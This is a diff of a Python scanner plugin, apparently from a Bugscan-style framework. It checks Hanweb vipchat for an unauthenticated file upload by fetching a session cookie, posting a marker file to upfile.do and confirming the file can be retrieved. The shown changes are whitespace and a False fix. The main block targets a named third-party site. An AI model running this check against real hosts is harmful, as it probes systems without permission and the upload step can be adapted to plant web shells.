@@ -5,16 +5,16 @@
 
 import re
 
-def assign(service, arg): 
+def assign(service, arg):
     if service == "hanweb":
         return True, arg
-		
+
 def audit(arg):
     getdata1 = 'vipchat/VerifyCodeServlet?var=clusterid'
     code, head, res, errcode, _ = curl.curl2(arg+getdata1)
     m1 = re.search('JSESSIONID=(.*?);',head)
     if code!= 200:
-        return false
+        return False
     raw = """
 POST /vipchat/servlet/upfile.do HTTP/1.1
 Host: www.notedyy.com
@@ -52,12 +52,12 @@ just test c4ca4238a0b923820dcc509a6f75849b
     if m :
         url = arg+ m.group(0)
         code, head, res, errcode, _ = curl.curl2(url)
-        if code ==200 and 'c4ca4238a0b923820dcc509a6f75849b' in res:    
+        if code ==200 and 'c4ca4238a0b923820dcc509a6f75849b' in res:
             security_hole(arg+getdata2+'   :file upload Vulnerable:')
-            
-        
-        
-           
-if __name__ == '__main__': 
+
+
+
+
+if __name__ == '__main__':
     from dummy import *
     audit(assign('hanweb', 'http://www.notedyy.com/')[1])
